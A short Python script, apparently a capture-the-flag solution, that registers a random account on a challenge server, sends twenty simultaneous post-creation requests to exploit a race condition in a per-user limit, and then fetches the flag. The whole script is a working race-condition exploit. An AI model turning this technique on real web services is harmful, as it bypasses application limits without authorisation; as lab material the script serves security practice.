import requests
import random
import concurrent.futures

web = "http://767edcff-7030-423e-88bb-0f7b852cf9d7.bugg.cc/"

s = requests.Session()

username ="datasnok-"+ str(random.randint(0,1000))
s.post(web + "/register", json={"username":username,"password":"pass"})
s.post(web + "/login", json={"username": username, "password": "pass"})

url = web + "/user/posts/create"
payload = {"title": "aa", "data": "aa"}

def send_request():
    response = s.post(url, json=payload)
    return response.status_code

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(send_request) for _ in range(20)]
    for i, future in enumerate(concurrent.futures.as_completed(futures)):
        print(f"Response {i + 1}: {future.result()}")


flag = s.get(web + "/user/flag")

print(flag.text)